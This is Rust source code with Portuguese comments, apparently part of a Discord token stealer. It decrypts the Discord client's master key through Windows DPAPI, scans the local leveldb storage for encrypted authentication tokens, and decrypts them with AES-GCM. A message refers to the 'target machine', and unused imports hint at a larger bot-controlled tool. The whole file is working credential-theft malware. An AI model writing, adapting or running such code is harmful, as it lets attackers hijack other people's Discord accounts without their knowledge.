use aes_gcm::aead::{Aead};
use aes_gcm::{Aes256Gcm, Nonce};
use base64;
use regex::Regex;
use aes_gcm::KeyInit;
use serde_json::Value;
use std::fs;
use std::fs::File;
use std::io::Read;
use std::path::Path;
use std::{env, process::Command};
use sysinfo::System;
use serenity::async_trait;
use serenity::model::{channel::Message, gateway::Ready};
use serenity::prelude::*;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
use windows::Win32::System::Memory::{LocalSize};
use std::ptr::null_mut;
use std::ffi::c_void;



pub async fn get_master_key(local_state_path: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let local_state_content = std::fs::read_to_string(local_state_path)?;
    let local_state_json: serde_json::Value = serde_json::from_str(&local_state_content)?;

    let encrypted_master_key_b64 = local_state_json["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or("Não foi possível encontrar a chave criptografada")?;

    //decodifica a chave base64
    let encrypted_master_key = base64::decode(encrypted_master_key_b64)?;

    let encrypted_master_key = &encrypted_master_key[5..];

    let master_key = win32_crypt_unprotect_data(encrypted_master_key);

    Ok(master_key)
}

pub fn win32_crypt_unprotect_data(encrypted_data: &[u8]) -> Vec<u8> {
    // Cria um DATA_BLOB para os dados criptografados
    let mut in_data = CRYPT_INTEGER_BLOB {
        cbData: encrypted_data.len() as u32,
        pbData: encrypted_data.as_ptr() as *mut u8,
    };

    //guarda/armazenará os dados descript
    let mut out_data = CRYPT_INTEGER_BLOB {
        cbData: 0,
        pbData: null_mut(),
    };

    //função CryptUnprotectData
    
    let result = unsafe {
        CryptUnprotectData(
            &mut in_data,     // Dados criptografados
            null_mut(),       // Título opcional
            null_mut(),       // Dados adicionais opcionais
            null_mut(),       // Ignorado
            null_mut(),       // Prompt structure opcional
            0,                // Flags
            &mut out_data,    // Dados descriptografados de saída
        )
    };

    if result.as_bool() {
        let decrypted_data = unsafe {
            std::slice::from_raw_parts(out_data.pbData, out_data.cbData as usize).to_vec()
        };

        //libera a memória guardada para o bufer de dados descrpt
        unsafe {
            LocalSize(out_data.pbData as *mut c_void);
        }

        decrypted_data
    } else {
        // Em caso de falha, retorna um vetor vazio (ou você pode lidar com o erro de outra forma)
        println!("Falha ao descriptografar dados");
        Vec::new()
    }
}

pub fn extract_tokens_from_leveldb(path: &str, master_key: &[u8]) -> Vec<String> {
    let mut tokens = Vec::new();
    let re = Regex::new("dQw4w9WgXcQ:[^\"]*").unwrap();

    //loop através dos arquivos no diretório
    for entry in fs::read_dir(path).expect("problema ao ler diretorio") {
        let entry = entry.expect("entrada de diretorio invalida");
        let path = entry.path();

        //verifique se o arquivo tem extensão .log  .ldb
        if path.extension().map_or(false, |ext| ext == "log" || ext == "ldb") {
            let mut file = File::open(&path).expect("problema ao ler arquivo");

            //conteúdo do arquivo como bytes, em vez de tentar converter diretamente para string
            let mut content = Vec::new();  // Use um vetor para manipular bytes para armazenar o conteúdo
            file.read_to_end(&mut content).expect("problema ao ler arquivo");

            //converter os bytes para string UTF-8 apenas se possível
            if let Ok(content_str) = String::from_utf8(content.clone()) {
                //se a conversão para string for bem-sucedida, continue o processamento com o regex
                for line in content_str.lines() {
                    //procura o token criptografado usando a expressão regular
                    if let Some(captures) = re.captures(line) {
                        let encrypted_token_b64 = &captures[0]
                            .split("dQw4w9WgXcQ:")
                            .nth(1)
                            .expect("formato de token invalido");
                        
                        let encrypted_token = base64::decode(encrypted_token_b64)
                            .expect("problema ao ler base64 token");

                        let nonce = &encrypted_token[3..15]; // Nonce
                        let ciphertext = &encrypted_token[15..]; // Ciphertext

                        // AES-GCM decryption
                        let cipher = Aes256Gcm::new_from_slice(master_key).expect("Failed to create AES key");
                        let nonce = Nonce::from_slice(nonce);

                        let token = cipher.decrypt(nonce, ciphertext).expect("problema para descriptar");
                        let token_str = String::from_utf8(token).expect("erro ao ler ou traduzir: UTF-8 token");
                        tokens.push(token_str.replace(".", " "));
                    }
                }
            } else {
                println!("Aviso: o arquivo não contém UTF-8 válido.");
            }
        }
    }

    tokens
}

pub async fn get_discord_tokens() -> Vec<String> {
    let appdata = dirs::config_dir().expect("problema para configurar diretorio").join("discord");

    // Verifica se o diretório do Discord existe
    if !Path::new(&appdata).exists() {
        return vec!["O Discord não está instalado na máquina alvo".to_string()];
    }

    let local_state_path = appdata.join("Local State");

    // Aqui lidamos com o Result de get_master_key
    match get_master_key(local_state_path.to_str().unwrap()).await {
        Ok(master_key) => {
            let leveldb_path = appdata.join("Local Storage/leveldb");
            // Extraímos os tokens utilizando a master key obtida
            extract_tokens_from_leveldb(leveldb_path.to_str().unwrap(), &master_key)
        },
        Err(_) => vec!["Não foi possível pegar a master key".to_string()],  // Em caso de erro, retornamos uma mensagem
    }
}

